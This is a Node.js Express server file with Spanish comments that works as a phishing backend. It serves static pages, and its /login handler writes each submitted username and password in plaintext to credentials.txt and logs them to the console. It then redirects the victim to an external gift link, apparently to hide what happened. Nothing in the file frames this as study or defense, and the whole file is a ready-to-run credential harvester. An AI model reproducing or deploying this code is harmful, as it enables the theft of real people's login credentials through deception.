const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;
  fs.appendFile('credentials.txt', logEntry, (err) => {
    if (err) {
      console.error('Error al guardar las credenciales:', err);
      res.status(500).send('Error en el servidor');
      return;
    }
    console.log('Credenciales guardadas:', logEntry);
    // Redirigir a una página de éxito
    res.redirect('https://gifft.me/es/o/l/u1dwyxojs1f6ghl61b02xua0');
  });
});

app.get('/success', (req, res) => {
  res.send('Inicio de sesión exitoso. ¡Bienvenido!');
});

app.listen(port, () => {
  console.log(`Servidor en ejecución en http://localhost:${port}`);
});
